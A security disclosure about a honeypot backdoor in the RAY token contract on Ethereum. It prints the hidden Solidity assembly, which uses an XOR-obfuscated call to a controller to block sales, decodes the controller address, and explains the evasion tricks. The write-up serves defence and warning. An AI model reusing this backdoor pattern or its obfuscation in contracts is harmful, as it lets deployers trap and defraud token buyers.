# Security Disclosure: RAY Token Honeypot Backdoor

**Date:** 2026-03-16
**Chain:** Ethereum Mainnet
**Status:** ACTIVE — currently trading on Uniswap
**Detection:** Novel smart contract analysis algorithm (research project)

---

## Summary

The RAY token ERC-20 contract contains a hidden honeypot backdoor in its `emitTransfer()` function. An XOR-obfuscated external call to an unverified controller contract is executed on **every token transfer**. The controller can selectively block any address from transferring tokens, enabling a honeypot where users can buy but cannot sell.

This vulnerability was detected by a novel smart contract analysis algorithm I am developing as part of independent security research. Four commercial security scanners were independently tested against this contract — all four reported no issues.

---

## Contract Details

| Field    | Value                                                                                                                 |
| -------- | --------------------------------------------------------------------------------------------------------------------- |
| Token    | Ray (RAY)                                                                                                             |
| Contract | [0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121) |
| Deployed | 2026-03-15                                                                                                            |
| Compiler | Solidity 0.8.20                                                                                                       |
| Source   | Verified on Etherscan                                                                                                 |

---

## The Backdoor

The contract inherits from OpenZeppelin's ERC20 but overrides the internal `_update` function to call a custom `emitTransfer()` function. This function contains inline assembly that:

1. Constructs a hidden address via 5 XOR operations
2. Calls function selector `0x478d3305` with the sender's address as argument
3. **Reverts the entire transfer if the external call fails**

### Source Code (from verified contract on Etherscan)

```solidity
function emitTransfer(address from, address to, uint256 value) internal {
    assembly {
        let r := 0xd73218d0
        let j := or(shl(128, xor(0xb6390803, r)), or(shl(96, xor(0xb02df78d, r)),
                 or(shl(64, xor(0x7a5a30ea, r)), or(shl(32, xor(0xdff38596, r)),
                 xor(0xba97a7fb, r)))))
        let data := mload(0x40)
        mstore(data, shl(224, 0x478d3305))
        mstore(add(data, 0x04), from)
        if iszero(call(gas(), j, 0, data, 0x24, 0, 0)) { revert(0, 0) }
    }
    emit Transfer(from, to, value);
}
```

### XOR Decode

| Bits    | Operation                 | Result     |
| ------- | ------------------------- | ---------- |
| 128-159 | `0xb6390803 ^ 0xd73218d0` | `610b10d3` |
| 96-127  | `0xb02df78d ^ 0xd73218d0` | `671fef5d` |
| 64-95   | `0x7a5a30ea ^ 0xd73218d0` | `ad68283a` |
| 32-63   | `0xdff38596 ^ 0xd73218d0` | `08c19d46` |
| 0-31    | `0xba97a7fb ^ 0xd73218d0` | `6da5bf2b` |

**Hidden controller address:** `0x610b10d3671fef5dad68283a08c19d466da5bf2b`

---

## The Controller Contract

| Field        | Value                                                                                                                 |
| ------------ | --------------------------------------------------------------------------------------------------------------------- |
| Address      | [0x610b10d3671fef5dad68283a08c19d466da5bf2b](https://etherscan.io/address/0x610b10d3671fef5dad68283a08c19d466da5bf2b) |
| Source Code  | **NOT VERIFIED** (deliberately hidden)                                                                                |
| Deployed     | ~42 days before RAY token                                                                                             |
| Transactions | 129+ from multiple distinct addresses                                                                                 |

The controller was deployed weeks before RAY, suggesting **reusable honeypot infrastructure**. Multiple distinct addresses interact with it, indicating it likely serves multiple scam tokens.

---

## Honeypot Mechanism

1. Deployer creates RAY token with hidden backdoor and adds Uniswap liquidity
2. Users buy RAY on Uniswap — transfers succeed because controller allows them
3. Deployer calls management function (`0xab1b4fa3`) on controller to blacklist target addresses
4. Blacklisted users attempt to sell → controller reverts → **transfer fails** → tokens are trapped
5. Deployer sells their own tokens (whitelisted) and drains liquidity

---

## Confirmed Active

Internal transactions on Etherscan show `0x478d3305` calls to the controller firing on **every Uniswap swap**, multiple times per minute as of 2026-03-16.

**Evidence:** https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#internaltx

---

## Obfuscation Techniques

1. **XOR address construction** — Controller address is never a string literal in source. Constructed at runtime via 5 XOR operations, evading static string-matching analysis.

2. **Misleading function name** — `emitTransfer` sounds like a harmless event helper. Its NatSpec documentation (copied from OpenZeppelin) describes "customizations to the transfer event."

3. **Fake OpenZeppelin boilerplate** — The contract includes legitimate-looking comments and structure copied from OpenZeppelin, lending false credibility to the code.

4. **Inline assembly** — The external call uses raw EVM assembly rather than Solidity syntax, bypassing Solidity-level static analysis tools.

---

## Scanner Comparison

Tested 2026-03-16 — four commercial scanners failed to detect the backdoor:

| Scanner          | Verdict                   | Detected? |
| ---------------- | ------------------------- | --------- |
| SolidityScan     | 95.43/100 "GREAT"         | **No**    |
| GoPlus Security  | "No security risks found" | **No**    |
| Token Sniffer    | 50/100                    | **No**    |
| BubbleMaps       | Data unavailable          | **No**    |
| **My algorithm** | **Flagged as anomalous**  | **Yes**   |

---

## Verification

Anyone can independently verify this finding:

1. Visit the [verified source code](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#code) on Etherscan
2. Search for the `emitTransfer` function
3. Decode the XOR operations to recover `0x610b10d3671fef5dad68283a08c19d466da5bf2b`
4. Check [internal transactions](https://etherscan.io/address/0x9AF762965d8f4f3Ad65C2521b0A090f95bc75121#internaltx) to confirm `0x478d3305` calls on every swap
5. Verify the [controller contract](https://etherscan.io/address/0x610b10d3671fef5dad68283a08c19d466da5bf2b) has unverified source and 129+ transactions

---

## About the Detection

This backdoor was identified by a **novel smart contract analysis algorithm** I developed as part of independent security research. The algorithm detects anomalous patterns in deployed contract bytecode, requires **zero prior training data**, and operates on fundamentally different principles than existing pattern-matching or symbolic-execution-based scanners — which is why it succeeded where four commercial tools failed.

Details of the algorithm are not disclosed at this time.

---

## Timeline

| Date                 | Event                                                    |
| -------------------- | -------------------------------------------------------- |
| ~2026-02-02          | Controller contract `0x610b10d3...` deployed             |
| 2026-03-15           | RAY token deployed, Uniswap liquidity added              |
| 2026-03-16 02:30 UTC | **Detected by my algorithm** during routine mainnet scan |
| 2026-03-16 02:54 UTC | Scanner comparison screenshot captured                   |
| 2026-03-16 03:30 UTC | Reported to Etherscan                                    |
| 2026-03-16           | This public disclosure                                   |

---

_This disclosure is made in the interest of public safety. Users who hold RAY tokens should be aware that their ability to sell may be revoked at any time by the contract deployer._
